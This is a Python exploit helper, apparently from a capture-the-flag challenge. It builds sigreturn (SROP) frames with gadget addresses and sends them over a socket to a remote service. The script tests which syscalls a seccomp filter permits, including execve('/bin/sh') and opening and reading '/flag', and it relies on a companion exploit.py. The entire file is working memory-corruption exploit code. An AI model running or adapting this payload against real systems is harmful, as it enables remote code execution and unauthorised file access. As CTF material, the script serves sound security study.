#!/usr/bin/env python3
"""Which syscalls does the container let through?

The frame delivers rax/rdi/rsi/rdx exactly as written (probe_args.py), so a syscall
issued through sigreturn either runs or is killed.  Every frame here ends with

    rip = 0x401069 (syscall; ret)      rsp = buf+0x78 holding 0x401000

so if the syscall *returns*, the `ret` pops 0x401000 and the restarted program leaks
p64(0x401000) back to us.  The answer is therefore binary:

    last 8 bytes == p64(0x401000)  -> syscall returned, so it is allowed (errno aside)
    nothing at all                 -> the process was killed, i.e. seccomp

execve("/no/such/file") is the control: it can only fail with ENOENT, so if even that
dies silently then execve is filtered and the flag has to come out via
openat/read/write instead of a shell.
"""
import socket
import struct
import time
import importlib.util

spec = importlib.util.spec_from_file_location("e", "exploit.py")
e = importlib.util.module_from_spec(spec)
spec.loader.exec_module(e)

OFF_TEXT = 0x20
OFF_ARGV = 0x30
RESTART = 0x401000
AT_FDCWD = (-100) & 0xFFFFFFFFFFFFFFFF


def body(buf, rax, rdi, rsi, rdx, text):
    b = bytearray(b"\x00" * (e.FRAME_AT + e.FRAME_LEN))
    tb = text.encode() + b"\x00"
    assert len(tb) <= 0x10, text
    b[OFF_TEXT:OFF_TEXT + len(tb)] = tb
    struct.pack_into("<Q", b, OFF_ARGV, buf + OFF_TEXT)     # argv[0] = &text
    struct.pack_into("<Q", b, OFF_ARGV + 8, 0)              # argv[1] = NULL
    struct.pack_into("<Q", b, e.OFF_G1, e.G1)
    struct.pack_into("<Q", b, e.OFF_SC, e.SC)
    struct.pack_into("<Q", b, e.OFF_BAIT, RESTART)
    args = {"TEXT": buf + OFF_TEXT, "ARGV": buf + OFF_ARGV}
    for off, val in ((e.F_RIP, e.SC), (e.F_RSP, buf + e.OFF_BAIT),
                     (e.F_RAX, rax), (e.F_RDI, args.get(rdi, rdi)),
                     (e.F_RSI, args.get(rsi, rsi)), (e.F_RDX, args.get(rdx, rdx)),
                     (e.F_EFLAGS, 0x246), (e.F_SEL, 0x33 | (0x2B << 48))):
        struct.pack_into("<Q", b, e.FRAME_AT + off, val)
    return bytes(b)


def one(label, nr, rdi=0, rsi=0, rdx=0, text="/flag"):
    s = socket.create_connection((e.HOST, e.PORT), timeout=25)
    try:
        L = struct.unpack("<Q", e.recvn(s, 8))[0]
        buf = (L - 0x80) & 0xFFFFFFFFFFFFFFFF
        s.sendall(b"\x90" * 24 + body(buf, nr, rdi, rsi, rdx, text))
        time.sleep(0.5)
        pre = e.drain(s, 0.3)
        s.sendall(b"Z" * 15)
        time.sleep(0.7)
        got = pre + e.drain(s, 2.5)
        if got[-8:] == struct.pack("<Q", RESTART) and len(got) >= 8:
            verdict = "RETURNED -> allowed"
        elif not got:
            verdict = "silent -> KILLED"
        else:
            verdict = "other %r" % got[:24]
        print("%-24s n=%-3d %s" % (label, len(got), verdict))
        return got
    finally:
        s.close()
    time.sleep(0.5)


if __name__ == "__main__":
    NR = {"read": 0, "write": 1, "open": 2, "close": 3, "execve": 59, "openat": 257}
    one("execve /no/such/file", NR["execve"], rdi="TEXT", rsi="ARGV", rdx=0,
        text="/no/such/file")
    one("execve /bin/sh", NR["execve"], rdi="TEXT", rsi="ARGV", rdx=0, text="/bin/sh")
    one("open /flag", NR["open"], rdi="TEXT", rsi=0, rdx=0, text="/flag")
    one("openat /flag", NR["openat"], rdi=AT_FDCWD, rsi="TEXT", rdx=0, text="/flag")
    one("close(999)", NR["close"], rdi=999)
    one("write(1,text,12)", NR["write"], rdi=1, rsi="TEXT", rdx=12, text="/flag")
